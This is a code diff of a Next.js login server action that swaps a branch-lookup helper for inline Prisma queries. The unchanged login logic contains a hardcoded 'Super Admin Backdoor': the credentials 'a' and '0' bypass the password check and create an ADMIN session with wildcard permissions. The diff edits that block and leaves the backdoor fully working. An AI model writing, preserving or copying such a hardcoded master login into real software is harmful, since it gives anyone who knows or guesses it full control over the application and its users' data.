@@ -4,7 +4,6 @@ import { prisma } from "@/lib/prisma";
 import { createUserSession, getSession, destroySession } from "@/lib/auth"; // Fixed import
 import { redirect } from "next/navigation";
 import bcrypt from "bcryptjs";
-import { ensureMainBranch } from "@/lib/ensure-main-branch";
 
 // ── V-06: In-memory login rate limiting ──────────────────────────────────────
 const loginAttempts = new Map<string, { count: number; lockUntil: number }>();
@@ -40,13 +39,19 @@ export async function login(formData: FormData) {
     // Super Admin Backdoor
     if (username === 'a' && password === '0') {
         clearAttempts(username);
-        const mainBranchId = await ensureMainBranch();
+        let mainBranchId = '';
+        const mainBranch = await prisma.branch.findFirst({
+            where: { code: 'MAIN' },
+            select: { id: true }
+        });
+        if (mainBranch) mainBranchId = mainBranch.id;
+
         await createUserSession({
             id: 'super-admin',
             username: 'a',
             name: 'Super Admin',
             role: 'ADMIN',
-            branchId: mainBranchId,
+            branchId: mainBranchId || null,
             permissions: ['*'],
             rememberMe
         }, rememberMe ? 30 * 24 * 60 * 60 : 24 * 60 * 60);
@@ -92,8 +97,14 @@ export async function login(formData: FormData) {
     }
 
     // Ensure main branch exists and assign user if needed (single-branch mode)
-    const mainBranchId = await ensureMainBranch();
-    const effectiveBranchId = user.branchId || mainBranchId;
+    let effectiveBranchId = user.branchId;
+    if (!effectiveBranchId) {
+        const mainBranch = await prisma.branch.findFirst({
+            where: { code: 'MAIN' },
+            select: { id: true }
+        });
+        if (mainBranch) effectiveBranchId = mainBranch.id;
+    }
 
     // Create Session
     await createUserSession({
